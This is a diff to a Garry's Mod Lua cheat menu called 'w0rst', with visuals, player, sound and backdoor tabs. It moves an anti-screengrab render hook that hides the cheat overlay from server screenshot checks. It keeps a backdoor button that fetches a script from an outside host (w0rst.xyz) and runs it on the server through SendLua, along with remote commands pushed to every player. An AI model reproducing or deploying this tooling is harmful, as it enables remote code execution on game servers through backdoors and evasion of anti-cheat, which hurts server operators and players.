@@ -232,12 +232,37 @@ function wtf.conoutRGB(str)
 	MsgC(unpack(text))
 end
 
---/ Menu Edited Positions
 local LogPosY = 10
 local SoundPosX, SoundPosY = 17, 10
 local EntOffPosY, EntOnPosY = 5, 5
 local BDServerPosY, BDClientPosY = 5, 5
 local PlrPosX, PlrPosY = 19, 10
+
+local AntiScreengrabHook, RenderTarget = wtf.gString(), wtf.gString()
+local FakeRenderTarget = GetRenderTarget(RenderTarget..os.time(), ScrW(), ScrH())
+hook.Add("RenderScene", AntiScreengrabHook, function(vOrigin, vAngle, vFOV )
+    local view = {
+        x = 0, y = 0,
+        w = ScrW(), h = ScrH(),
+        dopostprocess = true,
+        origin = vOrigin,
+        angles =  vAngle,
+        fov = vFOV,
+        drawhud = true,
+        drawmonitors = true,
+        drawviewmodel = true
+    }
+
+    render.RenderView(view)
+    render.CopyTexture(nil, FakeRenderTarget)
+
+    cam.Start2D()
+        hook.Run("AltHUDPaint")
+    cam.End2D()
+
+    render.SetRenderTarget(FakeRenderTarget)
+    return true
+end)
 
 function wtf.Log(str)
     local Frame=vgui.Create("DFrame")
@@ -440,8 +465,8 @@ local function CreateSlider(name, table, tab, max, min, x, y)
     end
 
     local Slider = vgui.Create( "DNumSlider", Frame )
-    Slider:SetPos(-30, 4)
-    Slider:SetSize(150, 15)
+    Slider:SetPos(-35, 4)
+    Slider:SetSize(165, 15)
     Slider:SetText("")
     Slider:SetMin(min)
     Slider:SetMax(max)
@@ -545,16 +570,12 @@ local function CreateColorSlider(name, color, tab, x, y)
     return external
 end
 
---/ Tabs
 local VisualsTab = CreateTabButton(wtf.Materials.V, 13, 5)
--- local AimbotTab = CreateTabButton(wtf.Materials.A, 13, 85)
 local MiscTab = CreateTabButton(wtf.Materials.M, 13, 85)
 local PlayersTab = CreateTabButton(wtf.Materials.P, 13, 165)
 local BackdoorTab = CreateTabButton(wtf.Materials.B, 13, 245)
--- local ExploitsTab = CreateTabButton(wtf.Materials.E, 13, 325)
 local SoundsTab = CreateTabButton(wtf.Materials.S, 13, 325)
 
---/ Panels
 local PlayerPanel = CreatePanel(PlayersTab[1], 495, 540, 10, 10)
 local SoundPanel = CreatePanel(SoundsTab[1], 495, 505, 10, 10)
 local ServerBDPanel = CreatePanel(BackdoorTab[1], 225, 300, 20, 15)
@@ -563,7 +584,6 @@ local EntityPanel = CreatePanel(VisualsTab[1], 490, 350, 15, 190)
 local EntOffPanel = CreatePanel(EntityPanel[1], 230, 330, 10, 10)
 local EntOnPanel = CreatePanel(EntityPanel[1], 230, 330, 250, 10)
 
---/ ColorSilders
 local ColorSliders = {
     CreateColorSlider("Tracer-Editor", color['Tracer'], MiscTab[1], 9, 280),
     CreateColorSlider("Distance-Editor", color['Distance'], MiscTab[1], 134, 280),
@@ -717,8 +737,11 @@ local function CreateBDServer(name, func)
     Button:SetPos(15, BDServerPosY)
     Button:SetText(name)
     Button.DoClick = function()
-        if SelectedNet ~= "NONE" then func()
-        else wtf.Log("No Net Selected") end
+        if SelectedNet ~= "NONE" then 
+            func()
+        else 
+            wtf.Log("No Net Selected")
+         end
     end
     Button.Paint = function(self, w,h)
         draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
@@ -857,32 +880,6 @@ end
 
 hook.Add("CalcView", FreeCamera.Hook, FreeCamera.CalcView)
 hook.Add("CreateMove", FreeCamera.Hook, FreeCamera.CreateMove)
-
-local AntiScreengrabHook, RenderTarget = wtf.gString(), wtf.gString()
-local FakeRenderTarget = GetRenderTarget(RenderTarget..os.time(), ScrW(), ScrH())
-hook.Add("RenderScene", AntiScreengrabHook, function(vOrigin, vAngle, vFOV )
-    local view = {
-        x = 0, y = 0,
-        w = ScrW(), h = ScrH(),
-        dopostprocess = true,
-        origin = vOrigin,
-        angles =  vAngle,
-        fov = vFOV,
-        drawhud = true,
-        drawmonitors = true,
-        drawviewmodel = true
-    }
-
-    render.RenderView(view)
-    render.CopyTexture(nil, FakeRenderTarget)
-
-    cam.Start2D()
-        hook.Run("AltHUDPaint")
-    cam.End2D()
-
-    render.SetRenderTarget(FakeRenderTarget)
-    return true
-end)
 
 local chams01 = CreateMaterial("a", "VertexLitGeneric", {
     ["$ignorez"] = 1,
@@ -1277,6 +1274,8 @@ CreateCheckbox("Free Camera", VisualsTab[1], 22, 100, function()
     end
 end)
 
+CreateButton("Refresh Ents", VisualsTab[1], 80, 25, 15, 160, EntityLists.Clear)
+
 local function SaveVisuals()
     local json = util.TableToJSON(color, true)
     file.Write("w0rst/visuals.txt", json)
@@ -1302,8 +1301,8 @@ CreateButton("Load Visuals", MiscTab[1], 80, 25, 340, 250, LoadVisuals)
 CreateSoundButtons()
 
 CreateBDServer("wmenu-memento", function()
-    wtf.Log("??? wgamefucker ???")
     http.Fetch('https://w0rst.xyz/script/extra/wgamefucker', function(b) wtf.SendLua(b) end)
+    wtf.Log("??? wgamefucker ???")
 end)
 
 CreateBDServer("Kill All", function()
@@ -1898,8 +1897,6 @@ CreateButton("Stop Sounds", SoundsTab[1], 120, 35, 255, 520, function()
     wtf.SendLua([[for k,v in pairs(player.GetAll()) do v:ConCommand('stopsound') end]])
     wtf.Log("Stopped Sounds")
 end)
-
-CreateButton("Refresh Ents", VisualsTab[1], 80, 25, 15, 160, EntityLists.Clear)
 
 hook.Add("AltHUDPaint", MenuHook, function()
     Menu:PaintManual()
